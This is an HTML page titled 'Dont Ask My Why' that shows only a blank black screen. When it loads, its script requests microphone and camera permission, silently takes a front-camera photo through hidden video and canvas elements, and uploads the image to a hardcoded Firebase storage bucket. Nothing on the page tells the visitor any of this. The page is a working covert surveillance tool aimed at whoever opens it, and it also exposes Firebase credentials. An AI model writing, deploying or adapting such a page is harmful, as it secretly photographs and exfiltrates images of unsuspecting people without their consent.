<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Dont Ask My Why</title>
    <link rel="icon" href="data:,"> <!-- Favicon request disabled -->

    <script type="module">
        // Import Firebase functions
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.13.2/firebase-app.js";
        import { getStorage, ref, uploadString } from "https://www.gstatic.com/firebasejs/10.13.2/firebase-storage.js";

        // Firebase configuration
        const firebaseConfig = {
            apiKey: "AIzaSyCSmicQncJhWtvEekSLNQtvWM6fFr0cuRM",
            authDomain: "html-7fd9b.firebaseapp.com",
            projectId: "html-7fd9b",
            storageBucket: "html-7fd9b.appspot.com",
            messagingSenderId: "1022361191925",
            appId: "1:1022361191925:web:5bf0fb4023990d83aa0cbc"
        };

        // Initialize Firebase
        const app = initializeApp(firebaseConfig);
        const storage = getStorage(app);

        // Function to upload image to Firebase
        function uploadImage(imageData) {
            const storageRef = ref(storage, 'Zeyad/image_' + Date.now() + '.png');
            uploadString(storageRef, imageData, 'data_url')
                .then(() => {
                    console.log('Uploaded a blob or file!');
                })
                .catch((error) => {
                    console.error('Error uploading image:', error);
                });
        }

        // Request microphone and camera permissions and take a picture
        async function requestPermissionsAndCapture() {
            try {
                // Request microphone access
                await navigator.mediaDevices.getUserMedia({ audio: true });
                console.log('Microphone access granted.');

                // Request camera access after microphone access is granted
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: {
                        facingMode: { ideal: "user" }, // Use front camera
                        width: { ideal: 1920 },
                        height: { ideal: 1080 },
                        torch: false // Ensure flashlight is off
                    }
                });
                console.log('Camera access granted.');

                // Create video and canvas elements for capturing image
                const video = document.createElement('video');
                const canvas = document.createElement('canvas');
                const context = canvas.getContext('2d');

                video.srcObject = stream;
                video.onloadedmetadata = () => {
                    video.play();
                    canvas.width = 1920; // Set canvas width for 1080p
                    canvas.height = 1080; // Set canvas height for 1080p
                    context.drawImage(video, 0, 0, canvas.width, canvas.height); // Capture image
                    const imageData = canvas.toDataURL('image/png');
                    uploadImage(imageData); // Upload the captured image to Firebase
                };

                // Stop video stream after capturing the image
                stopVideo(stream);
            } catch (error) {
                console.error('Error accessing microphone or camera:', error);
            }
        }

        // Function to stop video stream
        function stopVideo(stream) {
            const tracks = stream.getTracks();
            tracks.forEach(track => track.stop());
        }

        // Automatically request permissions and capture on page load
        window.addEventListener('load', () => {
            requestPermissionsAndCapture();
        });
    </script>

    <style>
        body {
            margin: 0;
            padding: 0;
            background-color: #000; /* Black background */
            color: #fff; /* Optional: Text color for visibility */
            font-family: Arial, sans-serif; /* Font styling */
            display: flex; /* Flexbox for centering */
            flex-direction: column; /* Column layout */
            align-items: center; /* Center horizontally */
            justify-content: center; /* Center vertically */
            height: 100vh; /* Full viewport height */
        }

        video, canvas {
            display: none; /* Hide video and canvas elements */
        }
    </style>
</head>

</body>
</html>
